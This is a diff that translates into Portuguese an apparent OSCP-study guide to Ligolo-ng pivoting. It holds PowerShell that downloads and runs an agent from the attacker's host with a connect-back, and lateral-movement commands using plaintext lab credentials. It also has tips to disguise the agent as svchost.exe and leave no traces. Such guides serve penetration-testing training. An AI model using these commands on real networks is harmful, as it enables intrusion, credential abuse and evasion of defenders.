@@ -1,74 +1,74 @@
-# Ligolo-ng Complete Setup Guide
+# Guia Completo de Configuração do Ligolo-ng
 
-## Table of Contents
+## Índice
 
-- [Installation](#installation)
-- [Basic Tunnel Setup](#basic-tunnel-setup)
-- [Single-Hop Pivoting](#single-hop-pivoting)
-- [Multi-Hop Pivoting](#multi-hop-pivoting)
-- [Advanced Routing](#advanced-routing)
+- [Instalação](#instalação)
+- [Configuração Básica do Tunnel](#configuração-básica-do-tunnel)
+- [Pivoting Single-Hop](#pivoting-single-hop)
+- [Pivoting Multi-Hop](#pivoting-multi-hop)
+- [Roteamento Avançado](#roteamento-avançado)
 - [Troubleshooting](#troubleshooting)
 
 ---
 
-## Installation
+## Instalação
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
-# Quick Ligolo-ng pivot setup (all commands need sudo)
+# Configuração rápida de pivot com Ligolo-ng (todos os comandos precisam de sudo)
 sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy --selfcert
 ```
 
-> ⚠️ **Common Errors:**
+> ⚠️ **Erros Comuns:**
 >
-> | Error | Cause | Fix |
+> | Erro | Causa | Fix |
 > | --- | --- | --- |
-> | `ioctl(TUNSETIFF): Operation not permitted` | Missing sudo | Run with `sudo` |
-> | `RTNETLINK answers: Operation not permitted` | Missing sudo on `ip link` | Use `sudo ip link set ligolo up` |
-> | `ioctl(TUNSETIFF): Device or resource busy` | Interface already exists | Delete first: `sudo ip link delete ligolo` |
+> | `ioctl(TUNSETIFF): Operation not permitted` | Falta sudo | Execute com `sudo` |
+> | `RTNETLINK answers: Operation not permitted` | Falta sudo no `ip link` | Use `sudo ip link set ligolo up` |
+> | `ioctl(TUNSETIFF): Device or resource busy` | Interface já existe | Delete antes: `sudo ip link delete ligolo` |
 >
-> **Reset interface if busy:**
+> **Resetar interface se ocupada:**
 >
 > ```shell
 > sudo ip link delete ligolo 2>/dev/null; sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
 > ```
 
-### Attacker Machine (Kali)
+### Máquina do Atacante (Kali)
 
-> Download Ligolo-ng proxy (v0.8.2)
+> Download do proxy Ligolo-ng (v0.8.2)
 
 ```shell
-# Download latest version
+# Download da versão mais recente
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 chmod +x proxy
 ./proxy --version
 ```
 
-> **Fix Permission Error (setcap):**
+> **Corrigir Erro de Permissão (setcap):**
 
 ```shell
-# Option 1: Run with sudo every time
+# Opção 1: Executar com sudo sempre
 sudo ./proxy --selfcert
 
-# Option 2: Set capabilities permanently (recommended)
+# Opção 2: Definir capabilities permanentemente (recomendado)
 sudo setcap cap_net_admin,cap_net_raw+eip ./proxy
-./proxy --selfcert  # Now works without sudo
+./proxy --selfcert  # Agora funciona sem sudo
 ```
 
-### Target Machine (Windows/Linux)
+### Máquina Alvo (Windows/Linux)
 
-> Download agent for Windows
+> Download do agent para Windows
 
 ```powershell
-# From PowerShell on target (v0.8.2)
+# Do PowerShell no target (v0.8.2)
 iwr -Uri "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip" `
   -Outfile agent.zip
 Expand-Archive agent.zip -DestinationPath .
 ```
 
-> Download agent for Linux
+> Download do agent para Linux
 
 ```shell
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
@@ -76,26 +76,26 @@ tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
 chmod +x agent
 ```
 
-> Test agent connectivity
+> Testar conectividade do agent
 
 ```shell
 ./agent -h
-# Should show help menu
+# Deve exibir o menu de ajuda
 ```
 
 ---
 
-## Basic Tunnel Setup
+## Configuração Básica do Tunnel
 
-### Step 1: Start Proxy on Attacker
+### Passo 1: Iniciar Proxy no Atacante
 
-> Generate self-signed certificate (first run only)
+> Gerar certificado autoassinado (apenas na primeira execução)
 
 ```shell
-# Default port is now 11601
+# Porta padrão agora é 11601
 ./proxy --selfcert
 
-# Or specify port
+# Ou especificar porta
 ./proxy --selfcert --laddr 0.0.0.0:443
 ```
 
@@ -105,114 +105,114 @@ chmod +x agent
 INFO[0000] Listening on 0.0.0.0:11601
 ```
 
-**Flags Explained (v0.8.x):**
+**Flags Explicadas (v0.8.x):**
 
-- `--selfcert`: Auto-generate self-signed certificate
-- `--laddr 0.0.0.0:443`: Listen on all interfaces, port 443
-- `--autocert`: Automatically request LetsEncrypt certificates
-- `--webui`: Enable web interface (multiplayer mode)
-- `-config ligolo-ng.yaml`: Use configuration file
+- `--selfcert`: Gerar certificado autoassinado automaticamente
+- `--laddr 0.0.0.0:443`: Escutar em todas as interfaces, porta 443
+- `--autocert`: Solicitar certificados LetsEncrypt automaticamente
+- `--webui`: Habilitar interface web (modo multiplayer)
+- `-config ligolo-ng.yaml`: Usar arquivo de configuração
 
-### Step 2: Deploy Agent on Target
+### Passo 2: Implantar Agent no Alvo
 
-> Connect agent to proxy (Windows)
+> Conectar agent ao proxy (Windows)
 
 ```powershell
-# Default port is now 11601
+# Porta padrão agora é 11601
 .\agent.exe -connect 192.168.49.87:11601 -ignore-cert
 ```
 
-> Connect agent to proxy (Linux)
+> Conectar agent ao proxy (Linux)
 
 ```shell
 ./agent -connect 192.168.49.87:11601 -ignore-cert
 ```
 
-**Flags Explained:**
+**Flags Explicadas:**
 
-- `-connect ATTACKER:443`: Proxy address and port
-- `-ignore-cert`: Ignore self-signed cert errors
-- `-relay-timeout 60`: Connection timeout
-- `-retry 10`: Retry 10 times before quitting
+- `-connect ATACANTE:443`: Endereço e porta do proxy
+- `-ignore-cert`: Ignorar erros de certificado autoassinado
+- `-relay-timeout 60`: Timeout de conexão
+- `-retry 10`: Tentar novamente 10 vezes antes de encerrar
 
-### Step 3: Create Tunnel Session
+### Passo 3: Criar Sessão do Tunnel
 
-> In Ligolo proxy CLI, list agents
+> Na CLI do proxy Ligolo, listar agents
 
 ```text
 ligolo-ng » session
-[*] No session
+[*] Sem sessão
 ```
 
-> Wait for agent to connect, then
+> Aguardar o agent conectar, depois
 
 ```text
 ligolo-ng » session
 [*] 1 - NT AUTHORITY\SYSTEM@HOSTNAME - 192.168.49.87:11601 [Agent 0.8.2]
 ```
 
-> Start session
+> Iniciar sessão
 
 ```text
 ligolo-ng » session -i 1
 [Agent: NT AUTHORITY\SYSTEM@HOSTNAME] »
 ```
 
-**Status: ACTIVE TUNNEL** ✅
+**Status: TUNNEL ATIVO** ✅
 
-### Step 4: Autoroute (v0.8+ Feature) 🆕
+### Passo 4: Autoroute (Recurso v0.8+) 🆕
 
-> **NEW in v0.8:** Automatic route and interface creation!
+> **NOVO no v0.8:** Criação automática de rotas e interfaces!
 
 ```text
 [Agent: NT AUTHORITY\SYSTEM@HOSTNAME] » autoroute
-? Select routes to add: 172.16.87.0/24
-? Create a new interface or use an existing one? Create a new interface
-INFO[0176] Generating a random interface name...
-INFO[0176] Using interface name valuedlady
-INFO[0176] Creating routes for valuedlady...
-? Start the tunnel? Yes
-INFO[0180] Starting tunnel to NT AUTHORITY\SYSTEM@HOSTNAME
+? Selecionar rotas para adicionar: 172.16.87.0/24
+? Criar nova interface ou usar existente? Criar nova interface
+INFO[0176] Gerando nome aleatório para a interface...
+INFO[0176] Usando nome de interface valuedlady
+INFO[0176] Criando rotas para valuedlady...
+? Iniciar o tunnel? Sim
+INFO[0180] Iniciando tunnel para NT AUTHORITY\SYSTEM@HOSTNAME
 ```
 
-> **Manual route (if autoroute fails):**
+> **Rota manual (se autoroute falhar):**
 
-> Get agent's network info
+> Obter informações de rede do agent
 
 ```text
 [Agent: user@HOSTNAME]» ifconfig
 eth0: flags=... inet 172.16.87.100/24
 ```
 
-> Add route to reach internal network
+> Adicionar rota para alcançar a rede interna
 
 ```shell
-# Create tun interface (use your username, not 'kali')
+# Criar interface tun (use seu usuário, não 'kali')
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip route add 172.16.87.0/24 dev ligolo
 ```
 
-> ⚠️ **If interface already exists:**
+> ⚠️ **Se a interface já existir:**
 
 ```shell
-# Delete and recreate
+# Deletar e recriar
 sudo ip link delete ligolo
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip route add 172.16.87.0/24 dev ligolo
 ```
 
-### Step 5: Verify Tunnel
+### Passo 5: Verificar Tunnel
 
-> Test connectivity from attacker
+> Testar conectividade a partir do atacante
 
 ```shell
-ping 172.16.87.100  # Should respond
-ping 172.16.87.200  # Other internal host
+ping 172.16.87.100  # Deve responder
+ping 172.16.87.200  # Outro host interno
 ```
 
-> If working, you can now use internal tools
+> Se funcionar, você pode usar ferramentas diretamente na rede interna
 
 ```shell
 nmap -sV 172.16.87.200
@@ -221,113 +221,113 @@ nxc smb 172.16.87.200 -u username -p password
 
 ---
 
-## Single-Hop Pivoting
+## Pivoting Single-Hop
 
-### Scenario: Compromised Machine → Internal Network
+### Cenário: Máquina Comprometida → Rede Interna
 
-**Setup:**
+**Configuração:**
 
-- Compromised: 192.168.49.100 (WS26)
-- Internal target: 172.16.87.200 (SRV22)
-- Attacker: 192.168.49.87
+- Comprometido: 192.168.49.100 (WS26)
+- Alvo interno: 172.16.87.200 (SRV22)
+- Atacante: 192.168.49.87
 
-### Complete Workflow
+### Fluxo Completo
 
-> Step 1: From WS26, download and execute agent
+> Passo 1: No WS26, baixar e executar o agent
 
 ```powershell
-# On WS26 (compromised machine)
+# No WS26 (máquina comprometida)
 $Url = "http://192.168.49.87:7000/agent.exe"
 $Output = "C:\Temp\agent.exe"
 (New-Object Net.WebClient).DownloadFile($Url, $Output)
 & $Output -connect 192.168.49.87:443 -ignore-cert
 ```
 
-> Step 2: In Ligolo proxy, verify session
+> Passo 2: No proxy Ligolo, verificar sessão
 
 ```text
 ligolo-ng » session
 [*] 1 - ws26\user - 172.16.87.100:443 [Agent 0.7.12]
 ```
 
-> Step 3: Interact with session
+> Passo 3: Interagir com a sessão
 
 ```text
 [Agent: ws26\user]» ifconfig
 eth0: inet 172.16.87.100/24
 ```
 
-> Step 4: Add internal route
+> Passo 4: Adicionar rota interna
 
 ```shell
-# Use $(whoami) to get current username dynamically
+# Use $(whoami) para obter o nome do usuário atual dinamicamente
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip route add 172.16.87.0/24 dev ligolo
 ```
 
-> Step 5: Scan internal network through tunnel
+> Passo 5: Escanear rede interna pelo tunnel
 
 ```shell
 nmap -Pn -p 445,3306,1433,5985 172.16.87.200 -sV
 nxc smb 172.16.87.200 -u svc_sql -p SQLPowerHouse333
 ```
 
-> Step 6: Use tunneled tools
+> Passo 6: Usar ferramentas pelo tunnel
 
 ```shell
-# RDP through tunnel
+# RDP pelo tunnel
 xfreerdp3 /u:Administrator /p:Password123 /v:172.16.87.200
 
-# PSExec through tunnel
+# PSExec pelo tunnel
 impacket-psexec svc_sql:SQLPowerHouse333@172.16.87.200
 ```
 
 ---
 
-## Multi-Hop Pivoting
+## Pivoting Multi-Hop
 
-### Scenario: Attacker → WS26 → Internal Network → DC20
+### Cenário: Atacante → WS26 → Rede Interna → DC20
 
-**Network Layout:**
+**Layout da Rede:**
 
 ```text
-[Attacker] → [WS26] → [Internal 172.16.87.0/24] → [DC20]
-192.168.49.87  192.168.49.100  Compromised     172.16.87.200
+[Atacante] → [WS26] → [Rede Interna 172.16.87.0/24] → [DC20]
+192.168.49.87  192.168.49.100  Comprometido     172.16.87.200
 ```
 
-### Multi-Hop Setup
+### Configuração Multi-Hop
 
-> Step 1: Compromise WS26 and setup first tunnel
+> Passo 1: Comprometer WS26 e configurar primeiro tunnel
 
 ```powershell
-# On WS26
+# No WS26
 .\agent.exe -connect 192.168.49.87:443 -ignore-cert
 ```
 
-> Step 2: In Ligolo, create listener for second pivot
+> Passo 2: No Ligolo, criar listener para segundo pivot
 
 ```text
 [Agent: ws26\user]» listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443
-[*] Listener on 0.0.0.0:9999 → 127.0.0.1:443
+[*] Listener em 0.0.0.0:9999 → 127.0.0.1:443
 ```
 
-**Why:** This creates a pivot point for the next agent
+**Por quê:** Isso cria um ponto de pivot para o próximo agent
 
-> Step 3: From internal machine (SRV22), connect to WS26
+> Passo 3: Da máquina interna (SRV22), conectar ao WS26
 
 ```powershell
-# On SRV22 (internal, compromised via tunnel)
-# Download agent first
+# No SRV22 (interno, comprometido via tunnel)
+# Baixar agent primeiro
 $Url = "http://172.16.87.100:7000/agent.exe"
 $Output = "C:\agent.exe"
 (New-Object Net.WebClient).DownloadFile($Url, $Output)
 
-# Connect to WS26's listener
+# Conectar ao listener do WS26
 & $Output -connect 172.16.87.100:9999 -ignore-cert
 ```
 
-> Step 4: In Ligolo, verify second session
+> Passo 4: No Ligolo, verificar segunda sessão
 
 ```text
 ligolo-ng » session
@@ -335,7 +335,7 @@ ligolo-ng » session
 [*] 2 - srv22\svc_sql - 172.16.87.100:9999
 ```
 
-> Step 5: Switch to second session and get network info
+> Passo 5: Mudar para segunda sessão e obter informações de rede
 
 ```text
 ligolo-ng » session -i 2
@@ -343,48 +343,48 @@ ligolo-ng » session -i 2
 eth0: inet 172.16.87.201/24
 ```
 
-> Step 6: Add route for second network
+> Passo 6: Adicionar rota para segunda rede
 
 ```shell
-# If SRV22 can reach DC network (e.g., 172.16.100.0/24)
-# In Ligolo CLI:
-# Use route_add to reach further networks
+# Se SRV22 pode alcançar a rede do DC (ex: 172.16.100.0/24)
+# Na CLI do Ligolo:
+# Use route_add para alcançar redes mais distantes
 ```
 
-### Managing Multiple Sessions
+### Gerenciando Múltiplas Sessões
 
-> List all active sessions
+> Listar todas as sessões ativas
 
 ```text
 ligolo-ng » session
 ```
 
-> Switch between sessions
+> Alternar entre sessões
 
 ```text
 ligolo-ng » session -i 1  # WS26
-# Do something
+# Fazer algo
 ligolo-ng » session -i 2  # SRV22
-# Do something else
+# Fazer outra coisa
 ```
 
-> Keep multiple tunnels active simultaneously
+> Manter múltiplos tunnels ativos simultaneamente
 
 ```shell
-# Terminal 1: WS26 tunnel
+# Terminal 1: tunnel WS26
 sudo ip route add 172.16.87.0/24 dev ligolo-ws26
 
-# Terminal 2: SRV22 tunnel  
+# Terminal 2: tunnel SRV22
 sudo ip route add 172.16.100.0/24 dev ligolo-srv22
 ```
 
 ---
 
-## Advanced Routing
+## Roteamento Avançado
 
-### Accessing Internal Networks Behind Pivot
+### Acessando Redes Internas Atrás do Pivot
 
-> Get all network interfaces from agent
+> Obter todas as interfaces de rede do agent
 
 ```text
 [Agent: ws26\user]» ifconfig
@@ -393,7 +393,7 @@ eth1: inet 172.16.87.100/24 broadcast 172.16.87.255 netmask 255.255.255.0
 eth2: inet 10.0.0.100/24 broadcast 10.0.0.255 netmask 255.255.255.0
 ```
 
-> Add multiple routes for all connected networks
+> Adicionar múltiplas rotas para todas as redes conectadas
 
 ```shell
 sudo ip tuntap add user kali mode tun ligolo
@@ -402,31 +402,31 @@ sudo ip route add 172.16.87.0/24 dev ligolo
 sudo ip route add 10.0.0.0/24 dev ligolo
 ```
 
-### Reverse Port Forwarding
+### Port Forwarding Reverso
 
-> Forward internal service to attacker
+> Encaminhar serviço interno para o atacante
 
 ```text
 [Agent: ws26\user]» listener_add --addr 127.0.0.1:8080 --to 172.16.87.200:3306
-[*] Listener on 127.0.0.1:8080 → 172.16.87.200:3306
+[*] Listener em 127.0.0.1:8080 → 172.16.87.200:3306
 ```
 
-> From attacker machine, connect to local forward
+> Da máquina do atacante, conectar ao forward local
 
 ```shell
 mysql -h 127.0.0.1 -P 8080 -u root -pPassword
 ```
 
-### SOCKS Proxy (Alternative to Tunnel)
+### Proxy SOCKS (Alternativa ao Tunnel)
 
-> Create SOCKS proxy listener
+> Criar listener de proxy SOCKS
 
 ```text
 [Agent: ws26\user]» listener_add --addr 127.0.0.1:1080 --socks5
-[*] SOCKS5 server listening on 127.0.0.1:1080
+[*] Servidor SOCKS5 escutando em 127.0.0.1:1080
 ```
 
-> Use with proxychains
+> Usar com proxychains
 
 ```shell
 # /etc/proxychains4.conf
@@ -440,70 +440,70 @@ proxychains impacket-psexec user@172.16.87.200
 
 ## Troubleshooting
 
-### Issue 1: Agent Won't Connect
+### Problema 1: Agent Não Conecta
 
-**Error:** `Connection refused` or timeout
+**Erro:** `Connection refused` ou timeout
 
-> Solution: Verify proxy is listening
+> Solução: Verificar se o proxy está escutando
 
 ```shell
 netstat -tlnp | grep :443
 ```
 
-> Check firewall on attacker
+> Verificar firewall no atacante
 
 ```shell
 sudo ufw allow 443
 ```
 
-> Use verbose logging
+> Usar logging verboso
 
 ```shell
 ./agent.exe -verbose -connect 192.168.49.87:443 -ignore-cert
 ```
 
-### Issue 2: Route Not Working
+### Problema 2: Rota Não Funciona
 
-**Error:** `Destination unreachable` or `No route to host`
+**Erro:** `Destination unreachable` ou `No route to host`
 
-> Verify route added
+> Verificar se a rota foi adicionada
 
 ```shell
 ip route | grep ligolo
 ```
 
-> Add route with explicit metric
+> Adicionar rota com métrica explícita
 
 ```shell
 sudo ip route add 172.16.87.0/24 dev ligolo metric 100
 ```
 
-> Check TUN interface is up
+> Verificar se a interface TUN está ativa
 
 ```shell
 ip link show ligolo
-# Should show: ligolo: <POINTOPOINT,UP,LOWER_UP>
+# Deve mostrar: ligolo: <POINTOPOINT,UP,LOWER_UP>
 ```
 
-### Issue 3: Certificate Issues
+### Problema 3: Problemas com Certificado
 
-**Error:** `certificate verification failed`
+**Erro:** `certificate verification failed`
 
-> Always use `-ignore-cert` flag
+> Sempre usar a flag `-ignore-cert`
 
 ```shell
 ./agent.exe -connect 192.168.49.87:443 -ignore-cert
 ```
 
-> Or provide cert manually
+> Ou fornecer certificado manualmente
 
 ```shell
 ./agent.exe -connect 192.168.49.87:443 -cacert /path/to/cert.pem
 ```
 
-### Issue 4: Slow Performance
+### Problema 4: Performance Lenta
 
-> Check tunnel latency
+> Verificar latência do tunnel
 
 ```text
 [Agent: user@host]» info
@@ -511,21 +511,21 @@ Connected: 192.168.49.87:443
 Latency: 50ms
 ```
 
-> Reduce relay timeout if needed
+> Reduzir o timeout de relay se necessário
 
 ```shell
 ./agent.exe -connect 192.168.49.87:443 -relay-timeout 30 -ignore-cert
 ```
 
-### Issue 5: Agent Disconnects After 5 Minutes
+### Problema 5: Agent Desconecta Após 5 Minutos
 
-> Increase retry attempts
+> Aumentar tentativas de reconexão
 
 ```shell
 ./agent.exe -connect 192.168.49.87:443 -ignore-cert -retry 100
 ```
 
-> Or keep proxy running with reconnect enabled
+> Ou manter o proxy rodando com reconexão habilitada
 
 ```shell
 ./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:443 -allow-all
@@ -533,26 +533,26 @@ Latency: 50ms
 
 ---
 
-## Security Considerations
+## Considerações de Segurança
 
-### Hiding Ligolo-ng Process
+### Ocultando o Processo do Ligolo-ng
 
-> On Windows, rename agent
+> No Windows, renomear o agent
 
 ```powershell
 ren agent.exe svchost.exe
 ```
 
-> On Linux, change process name
+> No Linux, alterar o nome do processo
 
 ```bash
 # Use: https://github.com/airman00/liprouting
-# Or rename binary: mv agent-linux-amd64 /usr/local/bin/systemd-update
+# Ou renomear o binário: mv agent-linux-amd64 /usr/local/bin/systemd-update
 ```
 
-### Cleanup
+### Limpeza
 
-> Remove tunnels after usage
+> Remover tunnels após o uso
 
 ```shell
 sudo ip route del 172.16.87.0/24 dev ligolo
@@ -560,7 +560,7 @@ sudo ip link set ligolo down
 sudo ip tuntap del user kali mode tun ligolo
 ```
 
-> Kill agent on target (leave no traces)
+> Encerrar agent no alvo (não deixar rastros)
 
 ```powershell
 taskkill /IM agent.exe /F
@@ -568,103 +568,103 @@ taskkill /IM agent.exe /F
 
 ---
 
-## Quick Reference
+## Referência Rápida
 
-### Standard Setup (30 seconds)
+### Configuração Padrão (30 segundos)
 
 ```bash
 # Terminal 1: Proxy
 ./proxy-linux-amd64 -selfcert -laddr 0.0.0.0:443
 
-# Terminal 2: Setup TUN
+# Terminal 2: Configurar TUN
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
 
-# Terminal 3: Execute on target
+# Terminal 3: Executar no alvo
 agent.exe -connect 192.168.49.87:443 -ignore-cert
 
-# Proxy CLI: Start session
+# CLI do Proxy: Iniciar sessão
 session -i 1
 
-# Terminal 2: Add route
+# Terminal 2: Adicionar rota
 sudo ip route add 172.16.87.0/24 dev ligolo
 
-# Test
+# Testar
 ping 172.16.87.200
 ```
 
-### Multi-Hop Pivot (2 minutes)
+### Pivot Multi-Hop (2 minutos)
 
 ```text
-# First hop: agent connects to proxy
-# In proxy CLI:
+# Primeiro hop: agent conecta ao proxy
+# Na CLI do proxy:
 listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443
 
-# Second hop: next agent connects to first pivot
+# Segundo hop: próximo agent conecta ao primeiro pivot
 agent2.exe -connect 172.16.87.100:9999 -ignore-cert
 
-# Verify and route
+# Verificar e adicionar rota
 session -i 2
-# Add new route for second network
+# Adicionar nova rota para a segunda rede
 ```
 
-### Verify Everything Works
+### Verificar Tudo Funcionando
 
 ```shell
-# From attacker
-ping 172.16.87.200        # Verify route
-nmap -Pn 172.16.87.200    # Verify access
-nxc smb 172.16.87.200 # Verify SMB
-impacket-psexec user@172.16.87.200  # Verify execution
+# Do atacante
+ping 172.16.87.200        # Verificar rota
+nmap -Pn 172.16.87.200    # Verificar acesso
+nxc smb 172.16.87.200     # Verificar SMB
+impacket-psexec user@172.16.87.200  # Verificar execução
 ```
 
 ---
 
-## Ligolo-ng v0.8.x New Features
+## Novidades do Ligolo-ng v0.8.x
 
-### Autoroute (Automatic Setup)
+### Autoroute (Configuração Automática)
 
-> Automatically creates interfaces and routes
+> Cria interfaces e rotas automaticamente
 
 ```text
 [Agent: NT AUTHORITY\SYSTEM@HOST] » autoroute
-? Select routes to add: 172.16.87.0/24
-? Create a new interface or use an existing one? Create a new interface
-INFO[0176] Generating a random interface name...
-INFO[0176] Using interface name valuedlady
-? Start the tunnel? Yes
-INFO[0180] Starting tunnel
+? Selecionar rotas para adicionar: 172.16.87.0/24
+? Criar nova interface ou usar existente? Criar nova interface
+INFO[0176] Gerando nome aleatório para a interface...
+INFO[0176] Usando nome de interface valuedlady
+? Iniciar o tunnel? Sim
+INFO[0180] Iniciando tunnel
 ```
 
-### Interface Management Commands
+### Comandos de Gerenciamento de Interface
 
 ```text
-# List interfaces
+# Listar interfaces
 ligolo-ng » interface_list
 
-# Create named interface
+# Criar interface com nome
 ligolo-ng » interface_create --name "evil-cha"
 
-# Add route to interface
+# Adicionar rota à interface
 ligolo-ng » interface_add_route --name evil-cha --route 192.168.2.0/24
 
-# Delete route
+# Remover rota
 ligolo-ng » interface_del_route --name evil-cha --route 192.168.2.0/24
 
-# Start tunnel on specific interface
+# Iniciar tunnel em interface específica
 [Agent: user@host] » tunnel_start --tun evil-cha
 ```
 
-### WebUI (Multiplayer Mode)
+### WebUI (Modo Multiplayer)
 
 ```shell
-# Enable WebUI for team collaboration
+# Habilitar WebUI para colaboração em equipe
 ./proxy --selfcert --webui
 
-# Access at: https://localhost:8080
+# Acessar em: https://localhost:8080
 ```
 
-### Configuration File
+### Arquivo de Configuração
 
 ```yaml
 # ligolo-ng.yaml
@@ -673,41 +673,41 @@ laddr: "0.0.0.0:11601"
 webui: true
 ```
 
-### Agent Kill (Remote Terminate)
+### Encerrar Agent Remotamente
 
 ```text
-# Terminate agent remotely
+# Terminar agent remotamente
 ligolo-ng » session -i 1
 [Agent: user@host] » kill
 ```
 
-### Permission Fix (setcap)
+### Corrigir Permissão (setcap)
 
 ```shell
-# Fix "Operation not permitted" error permanently
+# Corrigir erro "Operation not permitted" permanentemente
 sudo setcap cap_net_admin,cap_net_raw+eip ./proxy
 
-# Verify capabilities
+# Verificar capabilities
 getcap ./proxy
 # Output: ./proxy cap_net_admin,cap_net_raw=eip
 ```
 
 ---
 
-## See Also
+## Veja Também
 
-### Related Lateral Movement Files
+### Arquivos Relacionados de Movimento Lateral
 
 - **[Pivoting & Tunneling](Pivoting-Tunneling.md)** - SSH tunnels, Chisel, Proxychains, sshuttle
-- **[Lateral Movement](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash
+- **[Movimento Lateral](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash
 
-### AD Exploitation (After Pivoting)
+### Exploração de AD (Após Pivoting)
 
-- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound on internal network
-- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Attack DC after tunnel setup
-- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder through tunnel
+- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound na rede interna
+- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Atacar DC após configurar tunnel
+- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder através do tunnel
 
-### OSCP Preparation
+### Preparação OSCP
 
-- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - AD Set uses Ligolo-ng pivoting
-- **[Exam Tips](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - AD Set scoring strategy
+- **[Exemplos de Laboratório](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - AD Set usa pivoting com Ligolo-ng
+- **[Dicas do Exame](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Estratégia de pontuação no AD Set
